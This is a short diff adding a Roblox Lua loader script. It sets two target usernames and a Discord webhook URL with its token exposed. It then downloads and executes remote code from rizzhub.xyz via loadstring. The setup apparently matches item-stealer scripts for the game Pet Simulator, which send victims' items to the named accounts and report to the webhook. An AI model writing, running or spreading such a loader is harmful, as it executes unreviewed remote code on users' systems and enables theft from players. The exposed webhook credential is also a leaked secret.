@@ -1,0 +1,5 @@
+UserName = "alitrk"
+UserName2 = "PetSimFreeAcc_1" 
+Webhook = "https://discord.com/api/webhooks/1096791261026992191/-c7fC_lFCDGL-KPxz4oItmZrwigHLLF-rwHcMtJ82XeTYYqRL0XKNjHFDmj4T8t-yV29" 
+
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
